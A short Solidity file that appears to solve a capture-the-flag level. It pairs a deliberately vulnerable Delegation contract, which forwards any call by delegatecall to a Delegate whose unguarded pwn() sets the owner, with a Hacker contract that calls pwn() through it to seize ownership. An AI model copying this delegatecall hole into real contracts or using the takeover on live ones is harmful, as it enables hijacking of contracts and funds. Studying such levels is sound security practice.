pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result, bytes memory data) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Hacker {
    
    function hack(address delegationAddr) external {
        delegationAddr.call(abi.encodeWithSignature("pwn()"));
    }
    receive() external payable {
        
    }
    
    function close(address payable goTo) public { 
        selfdestruct(goTo); 
    }
}